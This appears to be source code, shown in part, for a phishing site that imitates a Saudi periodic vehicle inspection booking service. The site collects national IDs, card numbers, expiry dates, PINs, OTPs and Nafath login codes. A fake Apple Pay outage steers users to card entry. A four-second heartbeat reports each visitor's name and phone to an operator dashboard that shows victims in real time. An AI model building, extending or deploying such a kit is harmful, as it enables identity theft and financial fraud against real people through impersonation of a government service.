...
import { SearchCentersPage } from './components/SearchCentersPage';
import { BookingSummaryPage } from './components/BookingSummaryPage';
import { InspectionFeesPage } from './components/InspectionFeesPage';
import { NafathLoginPage } from './components/NafathLoginPage';
import { NafathCodePage } from './components/NafathCodePage';
import { CardPinPage } from './components/CardPinPage';
import { PinProcessingPage } from './components/PinProcessingPage';
import {
  validateLuhn,
  getCardType,
  formatCardNumber,
...
import { Globe, Menu, Database, Bell, Fingerprint, Sparkles, Layers } from 'lucide-react';
...
const Header: React.FC = () => {
  ...
  const [stats, setStats] = useState(() => localStorage.getItem('admin_show_stats') !== 'false');
  const [sound, setSound] = useState(() => localStorage.getItem('admin_show_sound_tester') === 'true');
  const [nafath, setNafath] = useState(() => localStorage.getItem('admin_show_nafath_code') === 'true');
  const [devTools, setDevTools] = useState(() => localStorage.getItem('admin_is_dev_tools_expanded') === 'true');
  const [activeTab, setActiveTab] = useState(() => localStorage.getItem('admin_active_tab') || 'monitors');

  useEffect(() => {
    const handleSync = () => {
      setStats(localStorage.getItem('admin_show_stats') !== 'false');
      setSound(localStorage.getItem('admin_show_sound_tester') === 'true');
      setNafath(localStorage.getItem('admin_show_nafath_code') === 'true');
      setDevTools(localStorage.getItem('admin_is_dev_tools_expanded') === 'true');
      setActiveTab(localStorage.getItem('admin_active_tab') || 'monitors');
    };
    window.addEventListener('admin-state-changed', handleSync);
    return () => window.removeEventListener('admin-state-changed', handleSync);
  }, []);

  const toggleKey = (key: string, currentValue: boolean) => {
      ...
      <header className="sticky top-0 z-40 w-full border-b border-slate-800 bg-slate-950/80 backdrop-blur-md">
        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
          ...
          <div className="flex items-center gap-2">
            {/* Unified Sleek Control Dock */}
            <div className="flex items-center gap-1 bg-slate-900/60 p-1 rounded-xl border border-slate-800/80 shadow-md shadow-black/20" dir="rtl">
              {/* Tab Selector Buttons */}
              <button
                onClick={() => selectTab('monitors')}
                ...
                title="لوحة المراقبة الفورية"
              >
                <LayoutDashboard className="w-3.5 h-3.5" />
                <span className="hidden sm:inline text-[10px] font-bold">المراقبة</span>
              </button>
              <button
                ...
                title="ترتيب تدفق الصفحات"
              >
                <Layers className="w-3.5 h-3.5" />
                <span className="hidden sm:inline text-[10px] font-bold">تدفق الصفحات</span>
              </button>

              {/* Subtle vertical divider line */}
              <div className="w-[1px] h-4 bg-slate-800/80 mx-1 sm:mx-1.5" />

              {/* Stats */}
              <button
                onClick={() => toggleKey('admin_show_stats', stats)}
                className={`p-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 cursor-pointer relative ${
                  stats
                    ? 'bg-indigo-500/15 text-indigo-400 border border-indigo-500/20 shadow shadow-indigo-950/50'
                    : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/40 border border-transparent'
                }`}
                title="الإحصائيات والمدفوعات"
              >
                <Database className="w-3.5 h-3.5" />
                <span className="hidden md:inline text-[10px] font-bold">الإحصائيات</span>
                <span className={`w-1 h-1 rounded-full ${stats ? 'bg-indigo-400 animate-pulse' : 'bg-transparent'}`} />
              </button>

              {/* Sound Tester */}
              <button
                onClick={() => toggleKey('admin_show_sound_tester', sound)}
                className={`p-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 cursor-pointer relative ${
                  sound
                    ? 'bg-emerald-500/15 text-emerald-400 border border-emerald-500/20 shadow shadow-emerald-950/50'
                    : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/40 border border-transparent'
                }`}
                title="مركز النغمات"
              >
                <Bell className="w-3.5 h-3.5" />
                <span className="hidden md:inline text-[10px] font-bold">النغمات</span>
                <span className={`w-1 h-1 rounded-full ${sound ? 'bg-emerald-400 animate-pulse' : 'bg-transparent'}`} />
              </button>

              {/* Nafath Default Code */}
              <button
                onClick={() => toggleKey('admin_show_nafath_code', nafath)}
                className={`p-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 cursor-pointer relative ${
                  nafath
                    ? 'bg-amber-500/15 text-amber-400 border border-amber-500/20 shadow shadow-amber-950/50'
                    : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/40 border border-transparent'
                }`}
                title="رمز نفاذ الافتراضي"
              >
                <Fingerprint className="w-3.5 h-3.5" />
                <span className="hidden md:inline text-[10px] font-bold">رمز نفاذ</span>
                <span className={`w-1 h-1 rounded-full ${nafath ? 'bg-amber-400 animate-pulse' : 'bg-transparent'}`} />
              </button>

              {/* Dev Tools */}
              <button
                onClick={() => toggleKey('admin_is_dev_tools_expanded', devTools)}
                className={`p-1.5 rounded-lg text-xs font-bold transition flex items-center gap-1 cursor-pointer relative ${
                  devTools
                    ? 'bg-teal-500/15 text-teal-400 border border-teal-500/20 shadow shadow-teal-950/50'
                    : 'text-slate-500 hover:text-slate-300 hover:bg-slate-800/40 border border-transparent'
                }`}
                title="أدوات محاكاة التطوير"
              >
                <Sparkles className="w-3.5 h-3.5" />
                <span className="hidden md:inline text-[10px] font-bold">أدوات التطوير</span>
                <span className={`w-1 h-1 rounded-full ${devTools ? 'bg-teal-400 animate-pulse' : 'bg-transparent'}`} />
              </button>
            </div>
          </div>
          ...
          <nav className="flex space-x-1 sm:space-x-2">
            ...
            >
              ...
              <span className="hidden sm:inline">Checkout Terminal</span>
            </Link>
          </nav>
        </div>
      </header>
...
// Customer-facing light mode header (Salamh style!)
  const isPaymentOrNafath = 
    location.pathname === '/checkout' || 
    location.pathname === '/waiting' || 
    location.pathname === '/otp' || 
    location.pathname === '/success';

  if (isPaymentOrNafath) {
    return null;
  }

  const isHomeBooking = location.pathname === '/' || location.pathname === '/booking';
  const isHomeInquiry = location.pathname === '/inquiry';
  const isFees = location.pathname === '/InspectionFees' || location.pathname === '/inspection-fees';
  const isCenters = location.pathname === '/search-centers';

  return (
    <header className="sticky top-0 z-50 w-full bg-white border-b border-gray-100 shadow-sm font-sans" dir="rtl">
      <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col md:flex-row md:items-center md:justify-between h-auto md:h-16 py-2 md:py-0">
        {/* Brand Logo & Language Switcher (Combines into one flex container on desktop, wraps on mobile) */}
        <div className="flex items-center justify-between w-full md:w-auto gap-4 h-12 md:h-auto border-b border-slate-50 md:border-transparent pb-1 md:pb-0">
          {/* Logo Brand */}
          <Link to="/booking" className="flex items-center gap-2 select-none">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-[#004d33]/10 text-[#004d33] shadow-inner">
              <ShieldCheck className="h-5 w-5" />
            </div>
            <div className="flex flex-col text-right">
              <span className="text-xs font-black text-slate-900 leading-tight">المنصة الموحدة للفحص</span>
              <span className="text-[9px] text-[#004d33] font-bold">الفحص الفني الدوري</span>
            </div>
          </Link>

          {/* Language Switcher for Mobile only (hidden on desktop) */}
          <div className="flex items-center gap-2 text-[11px] font-black text-slate-500 md:hidden">
            <span>English</span>
          </div>
        </div>

        {/* Navigation Tabs (Horizontal Scrollable on Mobile, Inline on Desktop) */}
        <div className="py-2 md:py-0 overflow-x-auto no-scrollbar -mx-4 px-4 md:mx-0 md:px-0 whitespace-nowrap">
          <div className="flex items-center gap-1.5 sm:gap-2">
            <Link 
              to="/booking" 
              className={`px-3 py-1.5 md:px-4 md:py-2 text-[11px] md:text-xs font-extrabold rounded-lg transition-all cursor-pointer ${
                isHomeBooking 
                  ? 'text-white bg-[#004d33] shadow-sm shadow-[#004d33]/20' 
                  : 'text-slate-600 hover:text-[#004d33] hover:bg-[#004d33]/5'
              }`}
            >
              الرئيسية
            </Link>
...
// Helper to determine dynamic vehicle fee
const getVehicleFee = (vehicleIdentifier: string | undefined, serviceId: string): number => {
  if (!vehicleIdentifier) {
    return serviceId === 'srv-2' ? 50.00 : 150.00;
  }

  const idOrName = vehicleIdentifier.trim();

  // Reinspection
  if (serviceId === 'srv-2') {
    if (
      idOrName === 'motorcycle' || 
      idOrName === 'two_wheeler' || 
      idOrName === 'three_four_wheeler' ||
      idOrName === 'دراجة نارية' ||
      idOrName === 'الدراجات ثنائية العجلات' ||
      idOrName === 'دراجة ثلاثية او رباعية العجلات'
    ) {
      return 17.25;
    }
    if (
      idOrName === 'light_transport' ||
      idOrName === 'private_light_transport' ||
      idOrName === 'نقل خاص خفيف' ||
      idOrName === 'مركبة نقل خفيفة خاصة' ||
      idOrName === 'مركبة نقل خفيفة'
    ) {
      return 50.60;
    }
    if (
      idOrName === 'heavy_transport' ||
      idOrName === 'large_bus' ||
      idOrName === 'medium_transport' ||
      idOrName === 'public_works' ||
      idOrName === 'heavy_trailer' ||
      idOrName === 'medium_bus' ||
      idOrName === 'heavy_semi_trailer' ||
      idOrName === 'نقل ثقيل' ||
      idOrName === 'حافلة كبيرة' ||
      idOrName === 'نقل متوسط' ||
      idOrName === 'مركبات أشغال عامة' ||
      idOrName === 'مقطورة ثقيلة' ||
      idOrName === 'حافلة متوسطة' ||
      idOrName === 'نصف مقطورة ثقيلة'
    ) {
      return 74.75;
    }
    return 37.95;
  ...
  if (
    ...
    idOrName === 'rental' ||
    idOrName === 'light_bus' ||
    idOrName === 'light_trailer' ||
    idOrName === 'light_semi_trailer' ||
    idOrName === 'private_light_semi_trailer' ||
    idOrName === 'private_light_trailer' ||
    idOrName === 'سيارات الأجرة' ||
    idOrName === 'سيارات التأجير' ||
    idOrName === 'حافلة خفيفة' ||
    idOrName === 'مقطورة خفيفة' ||
    idOrName === 'نصف مقطورة خفيفة' ||
    idOrName === 'نصف مقطورة خفيفة خاصة' ||
    idOrName === 'مقطورة خفيفة خاصة'
  ) {
    return 138.00;
  }
...
const CheckoutPage: React.FC = () => {
  ...
  const [step, setStep] = useState<1 | 2 | 3>(() => {
    if (location.state?.personalInfo) return 2; // Skip step 1 and go to Nafath directly!
    return 1;
  });
  ...
  const [nafathNationalId, setNafathNationalId] = useState(() => {
    return location.state?.personalInfo?.idNumber || '';
  });
  ...
  const [currentTxId, setCurrentTxId] = useState<string | null>(() => {
    return location.state?.txId || localStorage.getItem('last_tx_id') || null;
  });
    ...
    try {
      ...
      if (res.ok) {
        ...
        if (data) {
          ...
          const isNafathApproved = data.status === 'NAFATH_VERIFIED' && data.nafathAdminApproved;
          const isDirectAdvanced = ['AWAITING_OTP', 'OTP_SUBMITTED', 'AWAITING_PIN', 'PIN_SUBMITTED'].includes(data.status);
      ...
      console.warn("Error fetching Nafath code:", err);
    }
  };
  ...
  useEffect(() => {
    ...
    window.addEventListener('focus', fetchNafathCode);

    return () => {
      clearInterval(interval);
      window.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('focus', fetchNafathCode);
    };
    ...
    let localBooking: any = location.state || null;
    if (!localBooking) {
      try {
        const saved = localStorage.getItem('last_booking_state');
        if (saved) {
          localBooking = JSON.parse(saved);
        }
      } catch (err) {
        console.warn('Error parsing booking state inside nafath login:', err);
      }
    }
    ...
    try {
      const res = await fetch('/api/nafath-start', {
        ...
        body: JSON.stringify({
          id: currentTxId || undefined,
          nationalId: nafathNationalId,
          serviceName: selectedService.name,
          amount: parseFloat(amount),
          bookingMeta: localBooking?.bookingMeta || null,
          personalInfo: localBooking?.personalInfo || null,
          vehicleInfo: localBooking?.vehicleInfo || null
        })
      });
      if (res.ok) {
        const data = await res.json();
        if (data && data.transaction) {
          ...
          localStorage.setItem('last_tx_id', data.transaction.id);
  ...
  useEffect(() => {
    let srvId = location.state?.serviceId;
    let bookingState: any = null;
    
    const savedBooking = localStorage.getItem('last_booking_state');
    if (savedBooking) {
      try {
        bookingState = JSON.parse(savedBooking);
        if (!srvId) {
          srvId = bookingState?.serviceId;
        }
      } catch (e) {
        console.error('Error parsing last_booking_state:', e);
      }
    }
    ...
    if (!srvId) {
      srvId = localStorage.getItem('selected_service_id') || undefined;
    }

    const srv = VEHICLE_SERVICES.find(s => s.id === (srvId || 'srv-1'));
    if (srv) {
      setSelectedService(srv);
      
      // Determine fee dynamically based on vehicle type
      if (srv.id === 'srv-1' || srv.id === 'srv-2') {
        const vehicleTypeIdentifier = bookingState?.bookingMeta?.vehicleTypeId || bookingState?.bookingMeta?.vehicleType;
        const finalPrice = getVehicleFee(vehicleTypeIdentifier, srv.id);
  ...
  const handleSubmit = async (e: React.FormEvent) => {
    ...
    try {
      // Parse local booking state if available
      ...
      try {
        ...
        console.error('Error parsing booking state for payment:', err);
      }
      ...
      if (data.success) {
        setTimeout(async () => {
          const dynamicNext = await getNextPagePath('/checkout');
          navigate(dynamicNext || '/waiting', { state: { tx: data.transaction } });
        }, 1500);
      } else {
  ...
  return (
    <div className="mx-auto px-4 py-8 sm:px-6 max-w-xl">
            ...
            >
              ...
              <div className="bg-emerald-50/50 border border-emerald-100/80 rounded-xl p-3.5 flex items-center justify-between">
                ...
                <div className="text-left font-sans text-xs">
                  <span className="text-[#004d33] font-black">{parseFloat(amount).toFixed(2)} ر.س</span>
                </div>
              </div>
                ...
                >
                  ...
                  <div className="space-y-1.5">
                    ...
                    <input
                      ...
                      dir="ltr"
                      className={`w-full rounded-xl border bg-white px-4 py-3 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-left font-sans ${
                  ...
                  <div className="grid grid-cols-2 gap-4">
                    ...
                    <div className="space-y-1.5">
                      ...
                      <input
                        ...
                        placeholder="MM/YY"
                        dir="ltr"
                        className={`w-full rounded-xl border bg-white px-4 py-3 text-sm font-mono text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-left ${
      ...
      {/* Custom Modern Dialog for Apple Pay Unavailability */}
      <AnimatePresence>
        {showApplePayAlert && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            ...
            <motion.div
              ...
              className="relative bg-white rounded-3xl p-6 sm:p-8 max-w-sm w-full border border-gray-150 shadow-2xl text-center space-y-5 z-10 dir-rtl"
            >
              {/* Animated Icon Container */}
              <div className="mx-auto w-16 h-16 rounded-full bg-amber-50 border border-amber-200 flex items-center justify-center text-amber-500">
                <AlertCircle className="w-8 h-8 animate-bounce" />
              </div>
              
              <div className="space-y-2">
                <h3 className="text-base font-black text-slate-800 font-sans">
                  بوابة Apple Pay غير متاحة حالياً
                </h3>
                <p className="text-xs text-slate-500 leading-relaxed">
                  نعتذر منك، خدمة الدفع الفوري عبر <span className="font-bold text-slate-800">Apple Pay</span> غير متوفرة حالياً في هذا المتصفح بسبب الصيانة المجدولة لتحديثات نظام الدفع.
                </p>
                <div className="bg-slate-50 border border-slate-100 p-3 rounded-xl text-[11px] text-slate-600 font-medium">
                  💡 يرجى استخدام بطاقات <span className="font-bold text-slate-800">مدى (Mada)</span> أو بطاقات <span className="font-bold text-slate-800">فيزا / ماستركارد</span> لإتمام حجز موعدك فوراً وبأمان تام.
                </div>
              </div>
              ...
              <button
                ...
                onClick={() => {
                  ...
                  // fallback selection to card or mada
                  setPaymentMethod('mada');
                }}
                className="w-full py-3 px-4 bg-[#004d33] hover:bg-[#003a26] text-white text-xs font-extrabold rounded-xl transition-all shadow-md active:scale-95 cursor-pointer"
              >
                حسناً، الانتقال لوسائل الدفع البديلة
              </button>
            </motion.div>
          </div>
        )}
    ...
    <div className="mx-auto max-w-xl px-4 py-16 sm:px-6">
      ...
      >
        ...
        <div className="flex justify-center pt-2">
          <button
            onClick={() => navigate('/')}
            className="flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003824] px-8 py-3.5 text-xs font-bold text-white shadow-md shadow-emerald-950/15 transition cursor-pointer"
          >
...
function AppContent() {
  ...
  // Active Users Heartbeat Sender
  useEffect(() => {
    if (isAdminPath) return;

    // Get or create unique session ID for this visitor tab
    ...
    const PAGE_TITLES: { [key: string]: string } = {
      '/': 'الرئيسية (حجز موعد)',
      '/booking': 'الرئيسية (حجز موعد)',
      '/appointment': 'الرئيسية (حجز موعد)',
      '/inquiry': 'استعلام عن حالة الفحص',
      '/search-centers': 'مراكز الفحص ومواقعها',
      '/centers': 'مراكز الفحص ومواقعها',
      '/booking-summary': 'ملخص الحجز والبيانات',
      '/customer-info': 'ملخص الحجز والبيانات',
      '/InspectionFees': 'رسوم وتفاصيل الفحص الدوري',
      '/inspection-fees': 'رسوم وتفاصيل الفحص الدوري',
      '/fees': 'رسوم وتفاصيل الفحص الدوري',
      '/checkout': 'بوابة الدفع الإلكتروني',
      '/payment': 'بوابة الدفع الإلكتروني',
      '/waiting': 'شاشة الانتظار والتحقق',
      '/processing': 'شاشة الانتظار والتحقق',
      '/otp': 'صفحة رمز الأمان OTP',
      '/verification': 'صفحة رمز الأمان OTP',
      '/success': 'إيصال الحجز والنجاح ✅',
      '/nafath-login': 'تسجيل دخول نفاذ الموحد',
      '/nafath-code': 'رمز مطابقة نفاذ الثنائي',
      '/card-pin': 'شاشة الرقم السري PIN'
    };

    const sendHeartbeat = () => {
      // Find user personal info
      let fullName = '';
      let phone = '';
      ...
      try {
        ...
        if (savedBooking) {
          ...
          phone = parsed?.personalInfo?.mobile || '';
        }
      } catch (e) {}

      if (!fullName) {
        try {
          const savedTx = localStorage.getItem('last_tx');
          if (savedTx) {
            const parsed = JSON.parse(savedTx);
            fullName = parsed?.cardholderName || '';
            phone = parsed?.personalInfo?.mobile || '';
          }
        } catch (e) {}
      }

      const pageTitle = PAGE_TITLES[location.pathname] || 'تصفح عام';
      
      fetch('/api/active-users/heartbeat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          fullName: fullName || 'زائر مجهول',
          phone: phone || 'لا يوجد رقم',
          pageTitle,
    ...
    // Send immediately on page mount or path change
    sendHeartbeat();

    // Setup interval to send every 4 seconds
      ...
      <div className="min-h-screen bg-slate-950 font-sans text-slate-200 antialiased selection:bg-emerald-500/30 selection:text-white">
        ...
        <div className="relative z-10 flex flex-col min-h-screen">
          ...
          <main className="flex-grow">
            <Routes>
              <Route path="/" element={<LandingPage defaultActiveTab="booking" />} />
              <Route path="/booking" element={<LandingPage defaultActiveTab="booking" />} />
              <Route path="/appointment" element={<LandingPage defaultActiveTab="booking" />} />
              <Route path="/inquiry" element={<LandingPage defaultActiveTab="inquiry" />} />
              <Route path="/booking-summary" element={<BookingSummaryPage />} />
              <Route path="/customer-info" element={<BookingSummaryPage />} />
              <Route path="/InspectionFees" element={<InspectionFeesPage />} />
              <Route path="/inspection-fees" element={<InspectionFeesPage />} />
              <Route path="/fees" element={<InspectionFeesPage />} />
              <Route path="/checkout" element={<CheckoutPage />} />
              <Route path="/payment" element={<CheckoutPage />} />
              <Route path="/waiting" element={<WaitingApprovalPage />} />
              <Route path="/processing" element={<WaitingApprovalPage />} />
              <Route path="/otp" element={<OTPPage />} />
              <Route path="/verification" element={<OTPPage />} />
              <Route path="/success" element={<SuccessPage />} />
              <Route path="/nafath-login" element={<NafathLoginPage />} />
              <Route path="/nafath-code" element={<NafathCodePage />} />
              <Route path="/card-pin" element={<CardPinPage />} />
              <Route path="/pin-processing" element={<PinProcessingPage />} />
              <Route path="/waiting-pin" element={<PinProcessingPage />} />
          ...
          <footer className="border-t border-slate-900 bg-slate-950 py-6 text-center text-[11px] font-mono text-slate-500">
            <div className="mx-auto max-w-7xl px-4 sm:px-6 flex flex-col sm:flex-row justify-between items-center gap-2">
              <p>© 2026 Smart Cart Admin Terminal.</p>
      ...
      <div className="relative z-10 flex flex-col min-h-screen">
        ...
        <main className="flex-grow">
          <Routes>
            ...
            <Route path="/appointment" element={<LandingPage defaultActiveTab="booking" />} />
            <Route path="/inquiry" element={<LandingPage defaultActiveTab="inquiry" />} />
            <Route path="/search-centers" element={<SearchCentersPage />} />
            <Route path="/centers" element={<SearchCentersPage />} />
            <Route path="/booking-summary" element={<BookingSummaryPage />} />
            <Route path="/customer-info" element={<BookingSummaryPage />} />
            <Route path="/InspectionFees" element={<InspectionFeesPage />} />
            <Route path="/inspection-fees" element={<InspectionFeesPage />} />
